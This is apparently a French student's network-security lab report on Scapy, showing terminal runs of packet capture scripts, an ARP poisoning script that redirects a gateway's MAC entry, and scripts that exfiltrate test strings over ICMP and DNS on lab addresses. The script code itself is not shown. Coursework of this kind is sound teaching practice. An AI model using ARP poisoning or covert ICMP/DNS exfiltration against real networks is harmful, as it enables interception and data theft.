# TP4 SECU : Exfiltration

# Sommaire

- [Sommaire](#sommaire)
- [I. Getting started Scapy](#i-getting-started-scapy)
- [II. ARP Poisoning](#ii-arp-poisoning)
- [II. Exfiltration ICMP](#ii-exfiltration-icmp)
- [III. Exfiltration DNS](#iii-exfiltration-dns)


# I. Getting started Scapy

🌞 **`ping.py`**

> le `ping` est bloqué vers la passerelle.

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 ping.py
Begin emission

Finished sending 1 packets
...*
Received 4 packets, got 1 answers, remaining 0 packets
Pong reçu : QueryAnswer(query=<Ether  dst=c8:5e:a9:3e:3e:fb src=f2:39:c5:c0:07:e5 type=IPv4 |<IP  frag=0 proto=icmp src=10.33.67.174 dst=10.33.73.226 |<ICMP  type=echo-request |>>>, answer=<Ether  dst=f2:39:c5:c0:07:e5 src=c8:5e:a9:3e:3e:fb type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=28 id=47053 flags= frag=0 ttl=64 proto=icmp chksum=0x2142 src=10.33.73.226 dst=10.33.67.174 |<ICMP  type=echo-reply code=0 chksum=0x0 id=0x0 seq=0x0 unused=b'' |>>>)
```

🌞 **`tcp_cap.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 tcp_cap.py 
TCP SYN ACK reçu !
- Adresse IP src : 34.120.22.49
- Adresse IP dest : 10.33.67.174
- Port TCP src : 443
- Port TCP dst : 59881
```

🌞 **`dns_cap.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 dns_cap.py
DNS Ans : 104.26.10.233
WARNING: Socket <scapy.arch.bpf.supersocket.L2bpfListenSocket object at 0x107a501d0> failed with 'Layer [1] not found'. It was closed.
```

🌞 **`dns_lookup.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 dns_loockup.py 
DNS Ans 172.67.74.226
```

# II. ARP Poisoning


🌞 **`arp_poisoning.py`**

```bash
[et0@node1 ~]$ ip n s
10.1.1.1 dev enp0s1 lladdr be:d0:74:85:a8:65 REACHABLE 
10.1.1.254 dev enp0s1 lladdr 8e:a6:dc:e1:6a:b0 REACHABLE
```
```bash
[et0@node2 tp4-secu-2024]$ sudo python3 arp_poisoning.py
```
```bash
[et0@node1 ~]$ ip n s
10.1.1.12 dev enp0s1 lladdr 72:e9:3c:7d:a9:96 STALE 
10.1.1.1 dev enp0s1 lladdr be:d0:74:85:a8:65 REACHABLE 
10.1.1.254 dev enp0s1 lladdr de:ad:be:ef:ca:fe REACHABLE 
```

# II. Exfiltration ICMP

➜ **Ici, on va se servir de notre ami le ping pour exfiltrer des données.**

🌞 **`icmp_exf_send.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 icmp_exf_send.py 10.1.1.11 f
WARNING: No broadcast address found for iface bridge100
```

🌞 **`icmp_exf_receive.py`**

```bash
[et0@localhost ~]$ python3 icmp_exf_receive.py 
ERROR: Cannot set filter: libpcap is not available. Cannot compile filter !
f
```

# III. Exfiltration DNS

**DNS est donc un protocole qu'on peut aussi détourner de son utilisation première pour faire de l'exfiltration.**

🌞 **`dns_exfiltration_send.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 dns_exfiltration_send.py 10.1.1.11 toto
WARNING: No broadcast address found for iface bridge100
```